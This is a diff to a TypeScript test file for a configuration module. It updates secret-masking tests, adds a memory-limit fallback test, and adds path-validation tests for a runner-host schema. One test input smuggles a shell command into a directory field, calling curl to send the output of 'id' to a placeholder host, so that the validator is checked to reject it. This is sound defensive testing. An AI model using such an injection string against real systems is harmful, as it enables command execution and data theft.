@@ -40,6 +40,7 @@ beforeEach(() => {
   delete process.env["WHATSAPP_ENABLED"];
   delete process.env["WHATSAPP_ALLOWED_NUMBERS"];
   delete process.env["PORT"];
+  delete process.env["NAMEY_DB_URL"];
   fs.mkdirSync(tmpDir, { recursive: true });
 });
 
@@ -85,7 +86,6 @@ describe("config", () => {
     expect(display.slackWebhook).toBe("****cdef");
     expect(display.kwyjiboApiKey).toBe("****2345");
     expect(display.openaiApiKey).toBe("****8765");
-    expect(display.authToken).toBe("****-xyz");
 
     // Non-sensitive fields should be shown as-is
     expect(display.githubOwners).toEqual(["owner1"]);
@@ -108,7 +108,6 @@ describe("config", () => {
     expect(display.slackWebhook).toBe("Not configured");
     expect(display.kwyjiboApiKey).toBe("Not configured");
     expect(display.openaiApiKey).toBe("Not configured");
-    expect(display.authToken).toBe("Not configured");
   });
 
   it("writeConfig reads, merges, and writes config.json correctly", async () => {
@@ -133,14 +132,14 @@ describe("config", () => {
     fs.mkdirSync(path.dirname(cp), { recursive: true });
     fs.writeFileSync(
       cp,
-      JSON.stringify({ slackWebhook: "https://hooks.slack.com/existing", authToken: "existing-token" }),
+      JSON.stringify({ slackWebhook: "https://hooks.slack.com/existing", openaiApiKey: "existing-key" }),
     );
 
-    writeConfig({ slackWebhook: "", authToken: "", selfRepo: "new/repo" });
+    writeConfig({ slackWebhook: "", openaiApiKey: "", selfRepo: "new/repo" });
 
     const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
     expect(written.slackWebhook).toBe("https://hooks.slack.com/existing");
-    expect(written.authToken).toBe("existing-token");
+    expect(written.openaiApiKey).toBe("existing-key");
     expect(written.selfRepo).toBe("new/repo");
   });
 
@@ -188,6 +187,23 @@ describe("config", () => {
     expect(mod.LOG_RETENTION_DAYS).toBe(42);
   });
 
+  it("claudeWorkerMemoryMaxBytes falls back to 2 GiB default when env var is non-numeric", async () => {
+    const mod = await import("./config.js");
+
+    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
+    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
+
+    process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"] = "not-a-number";
+    try {
+      mod.reloadConfig();
+      expect(mod.CLAUDE_WORKER_MEMORY_MAX_BYTES).toBe(2_147_483_648);
+    } finally {
+      delete process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"];
+      // Restore so subsequent tests don't see NaN
+      mod.reloadConfig();
+    }
+  });
+
   it("onConfigChange fires listeners after writeConfig", async () => {
     const mod = await import("./config.js");
 
@@ -200,23 +216,38 @@ describe("config", () => {
     mod.writeConfig({ logRetentionDays: 99 });
 
     expect(listener).toHaveBeenCalledTimes(1);
+  });
+});
 
-    // Cleanup
-    mod.offConfigChange(listener);
+describe("RunnerHostSchema actionsDir validation", () => {
+  it("accepts a valid absolute path", async () => {
+    const { RunnerHostSchema } = await import("./config.js");
+    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/home/actions/actions-runner" }).success).toBe(true);
+    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/opt/runner_2.0" }).success).toBe(true);
   });
 
-  it("offConfigChange removes listener", async () => {
-    const mod = await import("./config.js");
+  it("rejects a path with shell injection characters", async () => {
+    const { RunnerHostSchema } = await import("./config.js");
+    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/home/actions; curl http://x/$(id) #" }).success).toBe(false);
+  });
 
-    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
-    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
+  it("rejects a relative path", async () => {
+    const { RunnerHostSchema } = await import("./config.js");
+    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "relative/path" }).success).toBe(false);
+  });
 
-    const listener = vi.fn();
-    mod.onConfigChange(listener);
-    mod.offConfigChange(listener);
+  it("rejects a path with spaces", async () => {
+    const { RunnerHostSchema } = await import("./config.js");
+    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a b" }).success).toBe(false);
+  });
 
-    mod.writeConfig({ logRetentionDays: 50 });
+  it("rejects a path with backtick", async () => {
+    const { RunnerHostSchema } = await import("./config.js");
+    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a`b" }).success).toBe(false);
+  });
 
-    expect(listener).not.toHaveBeenCalled();
+  it("rejects a path with ampersands", async () => {
+    const { RunnerHostSchema } = await import("./config.js");
+    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a&&b" }).success).toBe(false);
   });
 });
